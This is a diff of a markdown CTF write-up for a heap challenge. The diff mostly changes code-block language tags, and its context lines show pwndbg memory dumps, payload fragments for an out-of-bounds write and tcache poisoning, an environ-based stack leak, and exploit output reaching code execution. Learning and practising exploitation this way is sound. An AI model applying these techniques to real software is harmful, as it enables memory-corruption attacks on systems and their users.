@@ -53,7 +53,7 @@ if (!strcmp(buf,"Alohomora")) {
 
 - The magic charm is giving us _the power_ to Out-of-Bounds write into `magic_numbers[4]`! Lets use GDB to debug the binary and see what is after this array.
 
-```c
+```console
 pwndbg> x/6gx &magic_numbers 
 0x5060 <magic_numbers>:         0x0000000000000000      0x0000000000000000
 0x5070 <magic_numbers+16>:      0x0000000000000000      0x0000000000000000
@@ -149,7 +149,7 @@ def set_favorite(idx: int, set=True):
 
 - When we allocate both spells the heap looks like this:
 
-```
+```console
 pwndbg> vis
 ...
 0x5600eac78290  0x0000000000000000      0x0000000000000051      ........Q.......
@@ -170,14 +170,14 @@ pwndbg> x/2gx &spells
 
 - After freeing 
 
-```
+```console
 pwndbg> x/2gx &spells
 0x5600d6188080 <spells>:        0x0000000000000000      0x00005600eac782f0
 ```
 
 - And after setting our favorite spell
 
-```
+```console
 pwndbg> x/2gx &spells
 0x5600d6188080 <spells>:        0x0000000000000000      0x00005600eac78200
 ```
@@ -190,7 +190,7 @@ pwndbg> x/2gx &spells
 
 - We read from 
 
-```
+```nasm
 0x5600eac78200  0x0000000000000000      0x0000000000000000      ................ <- We start reading from here
 0x5600eac78210  0x0000000000000000      0x0000000000000000      ................
 0x5600eac78220  0x0000000000000000      0x0000000000000000      ................
@@ -279,7 +279,7 @@ typedef struct tcache_entry
 
 - With GDB we place a breakpoint at the end of `create_spell()` function and we check the offset from `environ` to the return address.
 
-```
+```console
 pwndbg> x/gx $rsp
 0x7fffffffdbd8: 0x0000555555555390
 pwndbg> x/gx &environ
@@ -302,7 +302,7 @@ payload += flat(0, 0x81)
 payload += b'A' * 0xc0
 ```
 
-```
+```nasm
 0x55bb426bc8f0  0x0061616161616161      0x00000000000000f1      aaaaaaa.........
 0x55bb426bc900  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
 0x55bb426bc910  0x0000000000000000      0x0000000000000081      ................ 
@@ -313,11 +313,11 @@ payload += b'A' * 0xc0
 
 - Now we free it with OOB write and `remove_spell()`
 
-```
+```nasm
 0x564fc6267b50  0x0061616161616161      0x00000000000000f1      aaaaaaa.........
-0x564fc6267b60  0x0000000564fc6267      0x3050663dd48ae799      gb.d........=fP0         <-- tcachebins[0xf0][0/1]
+0x564fc6267b60  0x0000000564fc6267      0x3050663dd48ae799      gb.d........=fP0 <- tcachebins[0xf0][0/1]
 0x564fc6267b70  0x0000000000000000      0x0000000000000081      ................
-0x564fc6267b80  0x0000564aa2da1fe7      0x3050663dd48ae799      ....JV......=fP0         <-- tcachebins[0x80][0/2]
+0x564fc6267b80  0x0000564aa2da1fe7      0x3050663dd48ae799      ....JV......=fP0 <- tcachebins[0x80][0/2]
 0x564fc6267b90  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
 0x564fc6267ba0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
 ```
@@ -335,16 +335,16 @@ metadata_tampering += b'r' * (needed_len - len(metadata_tampering)) # Whatever b
 malloc(metadata_tampering) # malloc a 0xf0 chunk and write the data over our fake chunk
 ```
 
-```
+```nasm
 0x563d16b5db50  0x0061616161616161      0x00000000000000f1      aaaaaaa.........
 0x563d16b5db60  0x7777777777777777      0x7777777777777777      wwwwwwwwwwwwwwww
 0x563d16b5db70  0x0000000000000000      0x0000000000000081      ................
-0x563d16b5db80  0x00007ffbc7d9d62d      0x00000000deadbeef      -...............         <-- tcachebins[0x80][0/2]
+0x563d16b5db80  0x00007ffbc7d9d62d      0x00000000deadbeef      -............... <- tcachebins[0x80][0/2]
 0x563d16b5db90  0x7272727272727272      0x7272727272727272      rrrrrrrrrrrrrrrr
 0x563d16b5dba0  0x7272727272727272      0x7272727272727272      rrrrrrrrrrrrrrrr
 ```
 
-```
+```console
 pwndbg> bins
 tcachebins
 0x80 [  2]: 0x563d16b5db80 —▸ 0x7ffea408bd70 ◂— 0x7ff95be2fd6b
@@ -356,7 +356,7 @@ tcachebins
 ### Getting the flag
 After executing our script we achieve code execution.
 
-```sh
+```console
 kali@kali:$ python3 exp.py 
 [*] HEAP_KEY            :   0x561046b4d
 [*] main_arena leak     :   0x7f8981fe6ce0
